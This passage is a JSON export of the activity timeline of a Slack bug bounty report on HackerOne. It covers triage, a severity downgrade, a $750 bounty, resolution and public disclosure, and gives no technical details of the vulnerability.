security.","automated_response":false,"created_at":"2020-02-19T18:11:46.806Z","updated_at":"2020-02-19T18:11:46.806Z","actor":{"username":"bugtriage-sophia","cleared":false,"url":"/bugtriage-sophia","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7093938,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Triaged!","automated_response":false,"created_at":"2020-02-19T20:48:20.417Z","updated_at":"2020-02-19T20:48:20.417Z","actor":{"username":"bugtriage-josh","cleared":false,"url":"/bugtriage-josh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7093951,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-02-19T20:49:55.644Z","updated_at":"2020-02-19T20:49:55.644Z","additional_data":{"old_severity":"High (8.8)","new_severity":"Medium (6.8)","old_severity_id":619673,"new_severity_id":637899},"actor":{"username":"bugtriage-josh","cleared":false,"url":"/bugtriage-josh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7113423,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for triaging! Can I ask why it was downgraded to 6.8? Also, what is the timeline for bounty, remediation, and disclosure?\n\nThanks!","automated_response":false,"created_at":"2020-02-21T16:58:19.566Z","updated_at":"2020-02-21T16:58:19.566Z","actor":{"username":"jhancock","cleared":false,"url":"/jhancock","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7149429,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"@jhancock the timeline for the bounty is...now!  \n\nWhile the impact here is high the vulnerability requires a high degree of access and other preconditions that are tough to achieve which impacts the overall risk.\n\nAppreciate your efforts here and we hope to see more future reports!  \n\nBest,\nBranden","automated_response":false,"created_at":"2020-02-25T18:55:43.836Z","updated_at":"2020-02-25T18:55:43.836Z","actor":{"url":"/slack","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Slack"}},"bounty_amount":"750.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"slack","collaborator":{"username":"jhancock","url":"/jhancock"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7149615,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks so much, Branden! I see the problem is fixed on GitHub as well. Any chance we can make this public? I think its something a lot devs fall victim to and would be good info for the general public.","automated_response":false,"created_at":"2020-02-25T19:24:03.335Z","updated_at":"2020-02-25T19:24:03.335Z","actor":{"username":"jhancock","cleared":false,"url":"/jhancock","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7199385,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for confirming @jhancock!\n\nI'll mark this report as resolved, and let you know about disclosure.","automated_response":false,"created_at":"2020-03-02T19:33:23.238Z","updated_at":"2020-03-02T19:33:23.238Z","actor":{"username":"bugtriage-josh","cleared":false,"url":"/bugtriage-josh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jhancock","url":"/jhancock"},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7200268,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @jhancock, just a quick update.\n\nIf you would like, you may request disclosure though HackerOne, which will make the ticket public.","automated_response":false,"created_at":"2020-03-02T22:06:38.261Z","updated_at":"2020-03-02T22:06:38.261Z","actor":{"username":"bugtriage-josh","cleared":false,"url":"/bugtriage-josh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7200282,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-03-02T22:10:24.094Z","updated_at":"2020-03-02T22:10:24.094Z","first_to_agree":true,"actor":{"username":"jhancock","cleared":false,"url":"/jhancock","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7511387,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-04-01T22:10:32.817Z","updated_at":"2020-04-01T22:10:32.817Z","actor":{"url":"/slack","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Slack"}},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}